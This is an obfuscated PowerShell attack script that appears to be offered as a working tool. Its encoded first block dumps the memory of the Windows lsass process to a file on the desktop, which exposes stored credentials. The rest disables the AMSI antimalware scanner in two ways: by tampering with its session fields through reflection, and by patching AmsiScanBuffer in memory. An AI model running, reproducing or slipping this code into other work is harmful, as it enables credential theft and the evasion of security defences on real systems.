#The following was generated by Invoke-Obfuscation

&( $EnV:cOMSpec[4,24,25]-JoIn'')( [stRInG]::JoiN( '' ,((100,23,5, 18 ,96 , 125 ,96 , 27 ,16 ,19 , 15,34 , 42, 37,35, 52 ,29,110, 1, 51 ,51 ,37, 45,34,44 ,57, 110 ,7 ,37 ,52, 20, 57 ,48,37 , 104 , 100 , 104 , 27,20, 37 ,56,52,110,5,46,35,47, 36 , 41 , 46 , 39 ,29, 122, 122 , 21,46,41,35 ,47 , 36, 37 ,110,7 , 37,52,19,52 , 50 ,41, 46,39 , 104 ,27,3 , 47,46 , 54 ,37 ,50 ,52 ,29 ,122 ,122, 6, 50 ,47,45 , 2 ,33 , 51,37 ,118, 116, 19,52 ,50 ,41, 46,39,104 , 103 ,21 , 55,2 , 117 ,1, 8 ,13 ,1 , 36,1, 2, 44, 1, 7, 112 ,1 ,12, 39 , 2, 14, 1,7,5 ,1,34,39,2, 40, 1,7 ,35 ,1,26, 17, 2, 52, 1, 7 , 21, 1 , 34,39, 2 ,112 , 1 , 3,116 , 1, 17 ,17 ,2, 113,1, 8 , 17 ,1 , 34,55,2 , 52, 1,7 ,5, 1 ,36 , 1 , 2 ,48, 1, 7 ,120,1,34 ,39,1, 53,1, 6, 35 , 1 ,33 ,17, 2, 53,1,7 , 17,1,34,55, 2,115 ,1, 8, 13 ,1 ,18,17,2, 57,1,8, 9 ,1,34 , 55 , 2 , 57, 1,6 , 9 , 1 ,26 ,17 ,2 ,55,1 ,7 , 120, 1 , 35,39,2, 112, 1 ,7 ,43, 1 , 34,39 ,2 ,46, 1, 1,125 ,125, 103 ,105, 105 ,105 ,105 ,77,74 ,100 ,23, 14 ,13 , 96,125, 96 , 100 , 23 , 5,18, 110, 7, 37, 52 ,14 ,37, 51,52,37, 36, 20, 57 ,48 , 37 ,104 , 103 , 14, 33,52 , 41, 54 , 37 , 13,37, 52, 40 , 47 , 36 , 51,103, 108 ,96,103, 14 ,47,46 ,16,53 , 34 , 44 , 41 ,35,103, 105, 77,74,100,6 ,44 ,33 ,39,51 , 96,125 ,96, 27 ,18 , 37, 38,44 ,37, 35, 52, 41, 47 ,46, 110 ,2, 41 ,46,36,41 ,46 ,39,6,44 , 33 ,39,51, 29,96, 103,14,47 , 46 , 16 , 53 ,34, 44, 41, 35,108, 96,19,52, 33,52,41, 35 ,103, 77 ,74 ,100 ,13 ,4 ,23,4 ,96, 125 ,96 , 100, 23 ,14 ,13,110,7 , 37 ,52 ,13 ,37, 52 ,40, 47 ,36, 104,100, 104,27 , 20,37,56 ,52, 110 , 5 ,46 , 35,47, 36 ,41,46, 39 , 29,122 , 122 ,21,46 ,41, 35,47 ,36 , 37, 110,7 ,37 ,52,19, 52 ,50, 41 , 46,39, 104 , 27 , 3, 47 ,46, 54, 37 , 50 ,52 ,29 , 122, 122, 6 ,50,47, 45 , 2 ,33 , 51 ,37 , 118 , 116 ,19 , 52, 50, 41,46 , 39,104 ,103,20,17 , 2 , 48 , 1 , 7,116, 1 ,33, 17 ,2,5,1 ,8,21 ,1, 34,17 , 2,55 , 1,6 ,35,1 ,35,39,2 ,48 , 1, 8,17 , 1 ,26, 17 , 2 , 5 , 1 , 8 , 21 , 1 , 34 ,17,2, 55,1 , 1 ,125 , 125,103 ,105,105, 105 , 108,96 ,100,6,44, 33 , 39,51, 105 ,77,74 ,100 ,13 , 4, 23, 6, 13 , 96 ,125,96 ,27 , 21,9 , 46 , 52 ,115 ,114 , 29 , 96, 114 ,77 ,74, 100 , 16 , 50 , 47,35 , 37, 51,51,96, 125 , 96, 7,37 , 52, 109 , 16 , 50,47, 35,37,51,51 , 96,109,14 , 33 , 45 ,37 ,96 ,44 ,51,33, 51, 51,77, 74 , 100 ,16 , 50, 47, 35 ,37 , 51 ,51 ,9 , 36, 96, 125 , 96 ,100,16, 50,47, 35,37 ,51 , 51 , 110 ,9 , 36 , 77,74,100 , 16,50 ,47, 35 ,37 , 51 ,51, 14 , 33 , 45 , 37, 96,125 ,96 ,100 ,16 , 50 ,47 , 35,37 ,51 ,51,110 , 14 , 33 , 45 ,37 ,77 , 74 , 100 ,16 ,50,47,35 , 37 , 51, 51, 8 ,33 , 46 ,36 ,44 ,37,96 ,125 , 96 ,100 , 16, 50,47 , 35, 37, 51, 51 ,110,8, 33 , 46, 36,44,37,77 ,74,100,4,53 ,45,48 ,6,41 ,44 , 37,16, 33,52, 40,96 , 125 , 96, 98 ,35,122 ,28, 53 ,51,37,50, 51 , 28 ,53,51 , 37, 50, 28,36 ,37 ,51,43 ,52 ,47,48 ,28 ,98,77,74 , 100 , 16,50, 47 , 35,37 , 51, 51 ,6, 41,44,37 ,14 , 33,45,37 ,96 ,125,96, 98, 100,104 , 100,16,50 , 47 ,35 ,37 , 51 ,51 ,14, 33, 45 ,37,105 ,31 ,100 ,104,100 , 16,50 , 47 ,35, 37 ,51, 51 , 9 , 36 ,105 , 110 , 36,45, 48, 98, 77 , 74 ,100 , 16,50 ,47, 35 , 37 , 51 , 51 , 4 , 53,45 ,48,16,33, 52 ,40 ,96 , 125, 96, 10 ,47,41,46 ,109, 16 ,33,52 , 40, 96, 100 ,4,53 ,45 , 48, 6,41, 44, 37,16, 33 , 52 ,40 ,96 , 100 , 16,50,47, 35 , 37 , 51 ,51,6,41,44, 37,14 , 33,45,37 , 77, 74 , 100,6 , 41 , 44 ,37,19, 52,50 , 37 , 33, 45 , 96 ,125,96 ,14,37, 55 , 109, 15 ,34, 42,37, 35, 52 ,96, 9, 15 , 110,6,41 ,44, 37 , 19, 52,50,37, 33, 45,104, 100, 16, 50 , 47,35 , 37,51, 51, 4 ,53 ,45 , 48,16, 33,52, 40,108, 96 , 27 ,9, 15 ,110 , 6,41,44,37, 13,47, 36 ,37 ,29 , 122 ,122,3 ,50 ,37, 33 , 52, 37 , 105 , 77, 74 ,100 ,18,37, 51 ,53 , 44 , 52 ,96 , 125 , 96, 100, 13 ,4, 23 ,4 , 110, 9,46,54 ,47, 43 ,37,104, 100 , 46,53, 44 , 44, 108 ,96,0,104, 100 , 16,50 , 47,35, 37, 51 ,51 , 8,33,46,36 , 44 , 37 , 108 , 100 , 16, 50,47,35 , 37 ,51, 51 ,9 , 36,108 , 100 , 6, 41 ,44,37 ,19 , 52,50, 37 ,33,45 ,110, 19 ,33,38, 37 ,6, 41,44, 37, 8, 33 , 46 ,36 ,44,37 , 108,100 , 13, 4 , 23,6 , 13, 108, 27 , 9,46,52,16, 52 , 50 , 29 , 122 ,122 ,26, 37,50, 47,108, 27 , 9 , 46 , 52 ,16, 52 , 50, 29 ,122 ,122, 26, 37, 50,47,108,27 , 9,46 ,52, 16,52, 50 , 29, 122 ,122, 26 ,37 ,50,47 ,105,105 , 77,74 ,100 , 6 ,41, 44, 37 ,19 , 52 , 50,37, 33, 45, 110, 3 ,44 ,47,51 , 37,104 ,105 ) | fOrEAcH{ [ChaR] ( $_-bXOr"0x40" )}) ))

$n=$null;$fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($n, $n);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($n, [IntPtr]$fwi);

#another bypass to test
$xavi='Am' + 'si'+'Scan'+'Buffer'
$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
$tmp=@()
$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$funcAddr = $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@("amsi.dll")), $xavi))

$funcAddrLong = [Long]$funcAddr + 33
$funcAddr2 = [IntPtr]$funcAddrLong

[Type[]] $func = @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
[Type] $delType = ([Bool])
$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
$type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')


$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@("kernel32.dll")), "VirtualProtect")), $type.CreateType())
$vp.Invoke($funcAddr2, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x48, 0x31, 0xDB)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr2, 3)

$vp.Invoke($funcAddr2, 3, 0x20, [ref]$oldProtectionBuffer)
